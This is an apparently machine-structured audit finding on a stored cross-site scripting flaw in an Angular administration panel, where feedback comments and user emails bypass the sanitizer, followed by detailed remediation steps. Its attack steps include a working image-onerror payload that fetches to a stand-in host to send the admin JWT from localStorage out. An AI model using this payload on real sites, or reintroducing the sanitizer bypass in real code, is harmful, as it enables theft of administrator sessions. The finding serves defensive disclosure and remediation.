  title: Cross-Site Scripting (XSS)
  affected_parameter: comment
  scenario: An attacker submits a feedback comment containing markup and waits for an administrator to open the admin panel.
    `findAllFeedbacks()` at `frontend/src/app/administration/administration.component.ts:91` passes each `feedback.comment`
    straight through `this.sanitizer.bypassSecurityTrustHtml()`, and `administration.component.html:60` renders the result
    into `[innerHTML]`. The bypass call disables the only escaping Angular would otherwise apply, so the stored comment executes
    in the administrator's origin. The same pattern sits two methods above at line 73, where `user.email` is wrapped in a
    `<span>` and bypassed for the user table rendered at `administration.component.html:26` and `:113` — a registered attacker
    controls that email string. Payloads run with the administrator's session, and since the JWT lives in `localStorage` (see
    the token-storage finding) a single script tag both exfiltrates the admin bearer token and issues authenticated calls
    to `/api/Users` on the admin's behalf.
  attack_steps:
  - An attacker submits site feedback whose comment body is `<img src=x onerror="fetch('//evil.tld/?t='+localStorage.token)">`.
  - The attacker waits for an administrator to open `/administration`, which loads the comment through `administration.component.ts:91`.
  - The administrator's browser executes the payload because the comment was marked trusted, sending the admin JWT from `localStorage`
    to the attacker's host.
  - The attacker replays that JWT as a bearer token against the admin-only REST endpoints.
  evidence_summary: '`administration.component.ts:91` calls `bypassSecurityTrustHtml()` on the raw `feedback.comment` value
    before it is bound to `[innerHTML]` at `administration.component.html:60`.'
  impact_description: Any user who can post feedback executes script in an administrator's session and steals the admin bearer
    token.
  likelihood: High
  impact: Critical
  risk: Critical
  controls_in_place: Angular's `DomSanitizer` is injected and would sanitize `[innerHTML]` by default; both call sites explicitly
    opt out of it. No server-side Content-Security-Policy header narrows what an injected script may do.
  mitigation_title: Remove the sanitizer bypass on feedback and user fields in the administration component
  remediation:
    effort: Low
    steps:
    - Delete the `bypassSecurityTrustHtml()` calls at `administration.component.ts:91` and `:73`; bind the plain values and
      let Angular's default `[innerHTML]` sanitizer run, or switch the template to interpolation `{{ }}`.
    - Move the presentational `<span class="confirmation|error">` wrapper from line 73 into `administration.component.html`
      as an `[ngClass]` binding so no HTML string has to be constructed in TypeScript.
    - Add an ESLint rule (`no-restricted-syntax` on `bypassSecurityTrust*` callees) so future components cannot reintroduce
      the bypass without review.
    - Sanitize feedback comments server-side on write as defence in depth, so already-stored payloads are neutralised.
    code_example: '// Before (administration.component.ts:73, :91)

      // user.email = this.sanitizer.bypassSecurityTrustHtml(`<span class="...">${user.email}</span>`)

      // feedback.comment = this.sanitizer.bypassSecurityTrustHtml(feedback.comment)


      // After: keep values as plain strings; move styling into the template

      user.sessionActive = this.doesUserHaveAnActiveSession(user)

      // administration.component.html

      // <mat-cell *matCellDef="let user" [ngClass]="user.sessionActive ? ''confirmation'' : ''error''">{{ user.email }}</mat-cell>

      // <p>{{ feedback.comment }}</p>'
    verification: Post feedback with the body `<img src=x onerror=alert(1)>`, open `/administration` as an administrator and
      assert the text renders literally with no dialog. Add a component test asserting `sanitizer.bypassSecurityTrustHtml`
      is never called by `AdministrationComponent`.
    reference: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
